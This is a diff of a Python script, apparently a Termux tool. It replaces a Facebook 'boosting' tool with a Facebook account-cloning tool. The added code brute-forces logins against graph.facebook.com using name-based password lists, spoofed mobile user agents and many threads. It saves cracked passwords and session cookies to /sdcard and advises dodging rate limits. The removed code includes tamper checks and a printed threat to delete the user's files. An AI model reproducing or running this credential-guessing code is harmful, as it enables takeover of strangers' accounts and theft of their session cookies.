@@ -1,2448 +1,1000 @@
+#──────────────{ IMPORT }──────────────#
+import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx,re,pycurl,io
+from bs4 import BeautifulSoup
+from os import path
+import os,base64,zlib,pip,urllib
+import requests,bs4,mechanize
+from os import system as clr
+from bs4 import BeautifulSoup as sop
+from pip._vendor import requests as requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
-import lzma
-import zlib
-import codecs
-import base64
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));
-
-
-import requests
-import re
-import os
-from bs4 import BeautifulSoup as bs
 import random
-import urllib3
-from mahdix import *
-from time import sleep
-from concurrent.futures import ThreadPoolExecutor
-import threading
-clear()
-import os
-from mahdix import *
-from time import sleep as slp
-from concurrent.futures import ThreadPoolExecutor
-import re
-import requests
-import json
-import random
-import json
-import requests
-import uuid
 import string
-import base64
-import urllib
-import urllib3
-import re
-import os
-import time
-import sys
-from datetime import datetime
-from urllib.request import urlopen
-from time import sleep as slp
-import re
-import requests
-import json
 
-def clr():
-    data = os.listdir('/sdcard')
-    if 'Android' in data:
-        print(' \x1b[1;91m[!] ALL YOUR FILES WILL REMOVE IF YOU TRY AGAIN! ')
-        exit()
-        return None
-    print()
-    return None
-    exit()
 
-from requests import api
-x = open(api.__file__, 'r').read()
-if 'print' in x:
-    clr()
-if 'marshal' in x:
-    clr()
-if 'lambda' in x:
-    clr()
-if 'lzma' in x:
-    clr()
-if 'gzip' in x:
-    clr()
-if 'bz2' in x:
-    clr()
-if 'binascii' in x:
-    clr()
-if 'zlib' in x:
-    clr()
-if 'exec' in x:
-    clr()
-if 'base64' in x:
-    clr()
-if 'base32' in x:
-    clr()
-if 'decompress' in x:
-    clr()
-if 'std' in x:
-    clr()
-if 'x =' in x:
-    clr()
-if 'x=' in x:
-    clr()
-if 'console' in x:
-    clr()
-if 'puts' in x:
-    clr()
-if 'fmt' in x:
-    clr()
-if 'disp' in x:
-    clr()
-if 'sys.stdout.write' in x:
-    clr()
-if 'open().write' in x:
-    clr()
-if 'write' in x:
-    clr()
-if 'logging.info' in x:
-    clr()
-if 'logging' in x:
-    clr()
-if 'printf' in x:
-    clr()
-if 'echo' in x:
-    clr()
-if 'os.system' in x:
-    clr()
-if 'system' in x:
-    clr()
-if '(url)' in x:
-    clr()
-if '{url}' in x:
-    clr()
-if '(data)' in x:
-    clr()
-if '{data}' in x:
-    clr()
-if '(headers)' in x:
-    clr()
-if 'DR4X' in x:
-    clr()
-if '{headers}' in x:
-    clr()
-from requests import sessions
-x = open(sessions.__file__, 'r').read()
-if 'print' in x:
-    clr()
-if 'marshal' in x:
-    clr()
-if 'lambda' in x:
-    clr()
-if 'lzma' in x:
-    clr()
-if 'gzip' in x:
-    clr()
-if 'bz2' in x:
-    clr()
-if 'binascii' in x:
-    clr()
-if 'zlib' in x:
-    clr()
-if 'exec' in x:
-    clr()
-if 'base64' in x:
-    clr()
-if 'base32' in x:
-    clr()
-if 'decompress' in x:
-    clr()
-if 'sdcard' in x:
-    clr()
-if "60*'='" in x:
-    clr()
-if "60 * '='" in x:
-    clr()
-if "'='" in x:
-    clr()
-if 'std' in x:
-    clr()
-if 'x =' in x:
-    clr()
-if 'x=' in x:
-    clr()
-if 'console' in x:
-    clr()
-if 'puts' in x:
-    clr()
-if 'fmt' in x:
-    clr()
-if 'sys.stdout.write' in x:
-    clr()
-if 'open().write' in x:
-    clr()
-if 'open' in x:
-    clr()
-if 'write' in x:
-    clr()
-if 'logging.info' in x:
-    clr()
-if 'logging' in x:
-    clr()
-if 'printf' in x:
-    clr()
-if 'open' in x:
-    clr()
-if 'echo' in x:
-    clr()
-if 'str(data)' in x:
-    clr()
-if 'str(headers)' in x:
-    clr()
-if 'str(url)' in x:
-    clr()
-if 'd(url)' in x:
-    clr()
-if 'c(url)' in x:
-    clr()
-if 'b(url)' in x:
-    clr()
-if 'a(url)' in x:
-    clr()
-if 'f(url)' in x:
-    clr()
-if 'j(url)' in x:
-    clr()
-if 'k(url)' in x:
-    clr()
-if 'l(url)' in x:
-    clr()
-if 'm(url)' in x:
-    clr()
-if 'n(url)' in x:
-    clr()
-if 'o(url)' in x:
-    clr()
-if 'p(url)' in x:
-    clr()
-if 'q(url)' in x:
-    clr()
-if 's(url)' in x:
-    clr()
-if 'r(url)' in x:
-    clr()
-if 't(url)' in x:
-    clr()
-if 'u(url)' in x:
-    clr()
-if 'v(url)' in x:
-    clr()
-if 'z(url)' in x:
-    clr()
-if 'y(url)' in x:
-    clr()
-if 'x(url)' in x:
-    clr()
-if 'w(url)' in x:
-    clr()
-if '((url)' in x:
-    clr()
-if '+url' in x:
-    clr()
-if '{url}' in x:
-    clr()
-if '(data)' in x:
-    clr()
-if '{data}' in x:
-    clr()
-if '(headers)' in x:
-    clr()
-if 'DR4X' in x:
-    clr()
-if '{headers}' in x:
-    clr()
-from requests import models
-x = open(models.__file__, 'r').read()
-if 'print' in x:
-    clr()
-if 'marshal' in x:
-    clr()
-if 'RPW-ALEX1107GRAY' in x:
-    clr()
-if 'ALEX' in x:
-    clr()
-if 'if self.url' in x:
-    clr()
-if 'lambda' in x:
-    clr()
-if 'lzma' in x:
-    clr()
-if 'gzip' in x:
-    clr()
-if 'bz2' in x:
-    clr()
-if 'binascii' in x:
-    clr()
-if 'zlib' in x:
-    clr()
-if 'exec' in x:
-    clr()
-if 'base64' in x:
-    clr()
-if 'base32' in x:
-    clr()
-if 'decompress' in x:
-    clr()
-if 'sys.stdout.write' in x:
-    clr()
-if 'blob' in x:
-    clr()
-if '.txt' in x:
-    clr()
-if 'x =' in x:
-    clr()
-if 'x=' in x:
-    clr()
-if 'approvalSheet' in x:
-    clr()
-if 'approval' in x:
-    clr()
-if 'console' in x:
-    clr()
-if 'puts' in x:
-    clr()
-if 'fmt' in x:
-    clr()
-if 'disp' in x:
-    clr()
-if 'open().write' in x:
-    clr()
-if 'write' in x:
-    clr()
-if 'open' in x:
-    clr()
-if 'logging.info' in x:
-    clr()
-if 'printf' in x:
-    clr()
-if 'echo' in x:
-    clr()
-if 'system' in x:
-    clr()
-if 'M4786==' in x:
-    clr()
-if 'M1107==' in x:
-    clr()
-if 'os.system' in x:
-    clr()
-if 'd(url)' in x:
-    clr()
-if 'c(url)' in x:
-    clr()
-if 'b(url)' in x:
-    clr()
-if 'a(url)' in x:
-    clr()
-if 'f(url)' in x:
-    clr()
-if 'j(url)' in x:
-    clr()
-if 'k(url)' in x:
-    clr()
-if 'm(url)' in x:
-    clr()
-if 'o(url)' in x:
-    clr()
-if 'p(url)' in x:
-    clr()
-if 'q(url)' in x:
-    clr()
-if 's(url)' in x:
-    clr()
-if 'e(url)' in x:
-    clr()
-if 'g(url)' in x:
-    clr()
-if 'h(url)' in x:
-    clr()
-if 'i(url)' in x:
-    clr()
-if 't(url)' in x:
-    clr()
-if 'u(url)' in x:
-    clr()
-if 'v(url)' in x:
-    clr()
-if 'z(url)' in x:
-    clr()
-if 'y(url)' in x:
-    clr()
-if 'x(url)' in x:
-    clr()
-if 'w(url)' in x:
-    clr()
-if '((url)' in x:
-    clr()
-if '+url' in x:
-    clr()
-if '{data}' in x:
-    clr()
-if 'str(data)' in x:
-    clr()
-if 'str(headers)' in x:
-    clr()
-if 'DR4X' in x:
-    clr()
-if '{headers}' in x:
-    clr()
-red = '\x1b[1;31m'
-green = '\x1b[1;32m'
-yellow = '\x1b[1;33m'
-blue = '\x1b[1;34m'
-cyan = '\x1b[1;36m'
-white = '\x1b[1;37m'
-black = '\x1b[1;30m'
-magenta = '\x1b[1;35m'
-grey = '\x1b[1;90m'
-orange = '\x1b[1;91m'
-lime = '\x1b[1;92m'
-sky_blue = '\x1b[1;94m'
-purple = '\x1b[1;95m'
-turquoise = '\x1b[1;96m'
-ses = requests.Session()
 
-def W_ueragnt():
-    chrome_version = random.randint(80, 99)
-    webkit_version = random.randint(500, 599)
-    safari_version = random.randint(400, 499)
-    windows_version = random.randint(8, 10)
-    is_win64 = random.choice([
-        True,
-        False])
-    if is_win64:
-        if not 'WOW64;':
-            user_agent = f'''Mozilla/5.0 (Windows NT {windows_version}.{''}Win64; x64) AppleWebKit/{webkit_version}.0 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/{safari_version}.0'''
-            return user_agent
+model2 ="""M2101K6G
+Aquaris U Plus
+SM-G780G
+SM-O497J
+SM-L427V
+SM-C297Z
+SM-G507X
+SM-Y634L
+SM-J204F
+SM-R911A
+SM-X801O
+SM-A792E
+SM-H270F
+SM-P993J
+SM-V233F
+SM-O861W
+SM-D182C
+SM-Y729G
+SM-Z367Q
+SM-U191O
+SM-U559U
+SM-B567Y
+SM-O846M
+SM-G342Z
+SM-K531M
+SM-I847H
+SM-A728M
+SM-L637H
+SM-L429N
+SM-P413J
+SM-N731T
+SM-R505B
+SM-A744X
+SM-O400L
+SM-F799H
+SM-Z679E
+SM-G822H
+SM-N489K
+SM-Z200Z
+SM-Y119O
+SM-E201F
+SM-N785T
+SM-G200V
+SM-R067J
+SM-N134B
+SM-N227J
+SM-K221P
+SM-S150D
+SM-A869J
+SM-H143V
+SM-C469H
+SM-T152I
+SM-Y575D
+SM-W880B
+SM-W460Q
+SM-Q159J
+SM-U637R
+SM-J924Q
+SM-W512P
+SM-I745B
+SM-O118H
+SM-U111M
+SM-U522B
+SM-B611V
+SM-G520J
+SM-D144B
+SM-C181B
+SM-V128Q
+SM-U167W
+SM-L098E
+SM-P454L
+SM-L943O
+SM-D368H
+SM-P485X
+SM-C715N
+SM-H010U
+SM-H710B
+SM-X633F
+SM-Z040T
+SM-Q391G
+SM-N451P
+SM-T115B
+SM-R248C
+SM-T618P
+SM-S067L
+SM-M619P
+SM-Q048A
+SM-I787D
+SM-X275W
+SM-G911F
+SM-R924W
+SM-S506Z
+SM-V941V
+SM-G016M
+SM-O008J
+SM-L296E
+SM-U876V
+SM-L600X
+SM-G169P
+SM-F578L
+SM-S727V
+SM-F213B
+SM-U822H
+SM-Q995Y
+SM-I602I
+SM-V225C
+SM-U921J
+SM-Z302E
+SM-Y080Z
+SM-X174G
+SM-T157W
+SM-M311W
+SM-H791P
+SM-Q343U
+SM-H261C
+SM-D442E
+SM-E047H
+SM-S082M
+SM-U311K
+SM-Z651V
+SM-I566H
+SM-I593C
+SM-L375P
+SM-D399D
+SM-Y086S
+SM-O365U
+SM-W782A
+SM-S236Q
+SM-D514J
+SM-W806F
+SM-W809F
+SM-M645P
+SM-W098A
+SM-O026U
+SM-Y689Z
+SM-D832N
+SM-C691X
+SM-D921H
+SM-G403Y
+SM-S210U
+SM-D768K
+SM-F912H
+SM-H856A
+SM-J184W
+SM-D512U
+SM-K786Z
+SM-Z107O
+SM-D499G
+SM-C815N
+SM-D590H
+SM-V695N
+SM-M093A
+SM-S354P
+SM-F657J
+SM-R743O
+SM-A180A
+SM-B651H
+SM-X279B
+SM-X429B
+SM-R588G
+SM-Y318K
+SM-G967W
+SM-P668C
+SM-B401K
+SM-S853U
+SM-A377K
+SM-K914A
+SM-J624R
+SM-L536Y
+SM-B190B
+SM-Q769S
+SM-Z872L
+SM-S322A
+SM-O621Y
+SM-N100L
+SM-A840S
+SM-E543H
+SM-H386M
+SM-Y932W
+SM-T496G
+SM-E768E
+SM-R031A
+SM-Q015D
+SM-P522K
+SM-D436Z
+SM-R077U
+SM-I233Z
+SM-H906Q
+SM-K838M
+SM-O369U
+SM-F458K
+SM-M382E
+SM-L337L
+SM-G904B
+SM-N351H
+SM-V670M
+SM-W266H
+SM-Q576G
+SM-G359C
+SM-R096P
+SM-F952H
+SM-Y608N
+SM-C736V""".splitlines()
 
-headers = {
-    'user-agent': W_ueragnt(),
-    'viewport-width': '847',
-    'x-asbd-id': '129477',
-    'x-fb-friendly-name': 'GroupCometJoinForumMutation',
-    'x-fb-lsd': 'wGh6ACr3OJ2v2rPBdXy-1o' }
-headersccc = {
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
-    'viewport-width': '546',
-    'x-asbd-id': '129477',
-    'x-fb-friendly-name': 'CometProfilePlusLikeMutation',
-    'x-fb-lsd': 'KA9qtqSd7hV8150DnYqqmy' }
-ah = 'BOOSTING-'
-imt = '-M1107=='
-ak = ' RPW-'
-myid = uuid.uuid4().hex[:10].upper()
+os.system('espeak -b 1000 "welcome axn command"')
+#──────────────{ LOOP }──────────────#
+loop = 0;oks = [];cps = [];id = []
+#──────────────{ COLOUR }──────────────#
+A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m'
+#──────────────{ LINEX }──────────────#
+def clear():os.system('clear');print(logo)
+def linex():print(f'{A}─────────────────────────────────────────────────')
+#──────────────{ NORMAL-UA-FOR-M8 }──────────────#
+ugen=[]
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/533.1'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt)
+for xd in range(5000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+    #ua
+    
+def randBuildLSB():
+    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+    VAPP = random.randint(410000000,499999999)
+    END = '[FBAN/MobileAdsManagerAndroid;FB_IAB/FB4A;FBAV/425.0.0.22.49;FBBV/873387085;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/fr_FR;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/MobileAdsManagerAndroid;FBAV/408.0.0.56.44;FBAN/EMA;FBLC/en_US;FBAV/346.0.0.8.76;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/sr_RS;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/12;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/410.0.0.26.115;FBBV/645124693;FBRV/0;FBPN/com.facebook.katana;FBLC/th_TH;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/FB4A;FBAV/278.0.0.25.54;FBBV/272257514;FBRV/0;FBPN/com.facebook.katana;FBLC/el_GR;FBMF/Blu;FBBD/Blu;FB_IAB/FB4A;FBAV/406.0.0.26.90;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/394.0.0.40.107;FB_IAB/FB4A;FBAV/388.0.0.32.105;FBRV/0;FBPN/com.facebook.katana;FBLC/id_ID;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/14;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+#──────────────{ UA-FOR-RANDOM }──────────────#
+def fuckx():
+	model = random.choice(["SM-G780G","SM-O497J","SM-L427V","SM-C297Z","SM-G507X","SM-Y634L","SM-J204F","SM-R911A","SM-X801O","SM-A792E","SM-H270F","SM-P993J","SM-V233F","SM-O861W","SM-D182C","SM-Y729G","SM-Z367Q","SM-U191O","SM-U559U","SM-B567Y","SM-O846M","SM-G342Z","SM-K531M","SM-I847H","SM-A728M","SM-L637H","SM-L429N","SM-P413J","SM-N731T","SM-R505B","SM-A744X","SM-O400L","SM-F799H","SM-Z679E"])
+	bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/"+"{density=3.0,width=1080,height=1920}"+f";FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
+	return bal
+#──────────────{ LOGO }──────────────#
+logo = f"""
+     \033[1;32m
 
-kok = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'w')
-kok.write(myid + imt)
-kok.close()
+	 █████      ██   ██     ███    ██ 
+	██   ██      ██ ██      ████   ██ 
+	███████       ███       ██ ██  ██ 
+	██   ██      ██ ██      ██  ██ ██ 
+	██   ██     ██   ██     ██   ████\x1b[1;92m[\x1b[1;97mV 0.1.1\x1b[1;92m
+\n{A}─────────────────────────────────────────────────
+\n{A}|➤| OWNER   : ASIF VAI
+\n{A}|➤| TOOL    : FILE/RANDOM
+\n{A}|➤| VERSION : 0.1.1
+\n{A}|➤| THIS SCRIPT NOT EDIT OKY [KEW ABLAMI XUDABI NA ]
+\n{A}|➤| abal xudra dure thak nyle tugo mare ami kharaya putki marmo
+\n{A}─────────────────────────────────────────────────"""
+#──────────────{ MENU }──────────────#
+def asif():
+	model = random.choice(["X6815C,", "Infinix X6511B","Infinix X678B","Infinix X605","Infinix X6710","Infinix X6711","Infinix X6716B","Infinix X6820","Infinix X677","Infinix X695","Infinix X6832","Infinix Zero 4 Plus"])
+	bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/443010639;FBDM/"+"{density=2.4,width=1080,height=2280}"+f";FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/{model};FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+	return bal
+#vuda
 
-def login():
-    token = open('.token.txt', 'r').read()
-    tokenku.append(token)
-    sy = requests.get('https://graph.facebook.com/me?access_token=' + tokenku[0])
-    public_menu()
-    return None
-    if KeyError:
-        Public()
-        return None
-    if None.exceptions.ConnectionError:
+def menu():
+	clear()
+	print(f"{A}|1| FILE CLONING")
+	print(f"{A}|2| RANDOM CLONING")
+	print(f"{A}|3| GMAIL CLONING")
+#	print(f"{A}|4| EXIT CLONING")
+	linex()
+	option = input(f'{A}|?| CHOICE : ')
+	if option in ['A','1']:__Filex__()
+	elif option in ['B','2']:__Randmx__()
+	elif option in ['C','3']:__Gmailx__()
+	elif option in ['D','4']:exit()
+	else:
+		print(f'\n{A}|=| OPTION FOUND');menu()
+#──────────────{ FILE }──────────────#
+def __Filex__():
+    clear()
+    print(f"{A}|=| EXAMPLE : /sdcard/Filename.txt ");linex();dfile = input(f'{A}|?| CHOICE  : ')
+    try:
+        dx = open(dfile,'r').read().splitlines()
+    except FileNotFoundError:
+        print(f'{A}|=| FILE NOT FOUND...');time.sleep(1);__Filex__()
+    clear()
+    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");linex();methodx = input(f'{A}|?| CHOICE : ')
+#	print(f"{A}|5| METHOD M5 ")
+#	print(f"{A}|6| METHOD M6 ")
+#	print(f"{A}|7| METHOD M7 ")
+#	print(f"{A}|8| METHOD M8 ")
+    dplist = []
+    try:
         clear()
-        print(logo)
-        print(' [×] Connection Timeout')
-        exit()
-        return None
-    if IOError:
-        Public()
-        return None
-
-
-def jalan(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.01)
-        return None
-
-
-def logo():
-    print('\x1b[1;32m\n\n                 █████╗ ██╗  ██╗██╗     \n                ██╔══██╗╚██╗██╔╝██║     \n                ███████║ ╚███╔╝ ██║     \n                ██╔══██║ ██╔██╗ ██║     \n                ██║  ██║██╔╝ ██╗███████╗\n                ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝\n\x1b[1;32m ─────────────────────────────────────────────────────── \n  Owner      :  Alexander Grayson\n  Facebook   :  AlexanderGraysonRecovery.IAmLimitless\n  Tool Type  :  RPW Automatic Boosting Tool\n  Network    :  FUCK YOU OPEN SOURCE FIX LINE KIDS\n  Version    :  1.8\n\x1b[1;32m ───────────────────────────────────────────────────────')
-
-
-def clear():
-    os.system('clear')
-
-
-def line():
-    print('\x1b[1;32m ───────────────────────────────────────────────────────')
-
-
-
-
-def get_access_token_from_file(file_path):
-    file = open(file_path, 'r')
-    print(None, None)
-    return file.read().strip().split('\n')
-    if not None:
+        pass_lmit = int(input(f'{A}|?| PASSWORD LIMIT : '))
+    except:
+        pass_lmit =1
+    clear()
+    print(f"{A}|=| EXAMPLE : firstlast | first123 |ETC| ");linex()
+    for i in range(pass_lmit):
+        dplist.append(input(f'{A}|=| PASSWORD NO.{i+1} :{G} '))
+    with ThreadPool(max_workers=30) as Asifx:
+        clear();total_ids = str(len(dx))
+        print(f"{A}|=| FILE UID {G}|{A} PASSWORD :{G} {total_ids} {G}|{Y} {pass_lmit} ");print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
+        for user in dx:
+            ids,names = user.split('|')
+            passlist = dplist
+            if methodx in ['1']:Asifx.submit(__file_M1__,ids,names,passlist)
+            if methodx in ['2']:Asifx.submit(__file_M2__,ids,names,passlist)
+            if methodx in ['3']:Asifx.submit(__file_M3__,ids,names,passlist)
+            if methodx in ['4']:Asifx.submit(__file_M4__,ids,names,passlist)
+            if methodx in ['5']:Asifx.submit(__file_M5__,ids,names,passlist)
+            if methodx in ['6']:Asifx.submit(__file_M6__,ids,names,passlist)
+            if methodx in ['7']:Asifx.submit(__file_M7__,ids,names,passlist)
+            if methodx in ['8']:Asifx.submit(__file_M8__,ids,names,passlist)
+    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
+#──────────────{ FILE-METHOD-M1 }──────────────#
+def __file_M1__(ids,names,passlist):
+    try:
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r{A}|ASIF-M1| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
+            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
+            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
+            if "session_key" in po:
+                token = po['access_token']
+                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
+                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)
+                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
+                open('/sdcard/ASIF-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                print(f'\r\r{R}|A x N_CP| '+ids+f' | '+pas)
+                open('/sdcard/ASIF-M1-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
         pass
-    return None
-    if FileNotFoundError:
-        print(f'''{red}  Start the tool first!''')
-        return None
-
-
-def convert_to_traodoisub(url):
-    response = requests.post('https://id.traodoisub.com/api.php', data = {
-        'link': url })
-    if response.status_code == 200:
-        result = response.json().get('id')
-        return result
-    return None
-    if Exception:
-        e = None
-        print(f'''An error occurred: {e}''')
-        e = None
-        del e
-        return None
-    e = None
-    del e
-
-
-def extract_uid_from_link(post_link):
-    pattern = 'https://www\\.facebook\\.com/(\\d+)/posts/[^/]+/?'
-    match = re.match(pattern, post_link)
-    if match:
-        return match.group(1)
-    print('Invalid post link.')
-
-
-def store():
-    clear()
-    logo()
-    print(f'''{white}  CHOOSE AN OPTION:''')
-    print(f'''{yellow}  [1] {blue}VIEW STORE PAGES AND ACCOUNT''')
-    print(f'''{yellow}  [2] {blue}REMOVE SPECIFIC STORE PAGES AND ACCOUNT''')
-    line()
-    choice = input(f'''{yellow}  Choose : {green}''')
-    line()
-    if choice == '1':
-        display_file_info()
-        return None
-    if None == '2':
-        choose_file_and_delete_line()
-        return None
-    print(f'''{red}  Invalid choice!''')
-
-
-def choose_file_and_delete_line():
-    print(f'''{white}  CHOOSE SPECIFIC LINE TO DELETE:''')
-    print(f'''{yellow}  [1] {blue}VIEW YOUR LIST OF FRA''')
-    print(f'''{yellow}  [2] {blue}VIEW YOUR LIST OF RPA''')
-    print(f'''{yellow}  [3] {blue}VIEW YOUR LIST OF FRA PAGES''')
-    print(f'''{yellow}  [4] {blue}VIEW YOUR LIST OF RPA PAGES''')
-    print(f'''{red}  [0] {red}RETURN TO MAIN MENU''')
-    line()
-    account_choose = input(f'''{yellow}  Choose : {green}''')
-    line()
-    if account_choose == '1':
-        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT-NAME-ID.txt'
-    if account_choose == '2':
-        path_file = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT-NAME-ID.txt'
-    if account_choose == '3':
-        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt'
-    if account_choose == '4':
-        path_file = '/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt'
-        check_path = '/sdcard/.EXTRACT-TOKEN-RP-PAGES-NAME-ID.txt'
-    if account_choose == '0':
-        print('Returning...')
-        return None
-    print('Invalid choice')
-    return None
-    delete_line(path_file, check_path)
-
-
-
-
-def display_file_info():
-    print(f'''{white}  CHOOSE FILE TO DISPLAY INFO:''')
-    print(f'''{yellow}  [1] {blue}VIEW YOUR LIST OF FRA''')
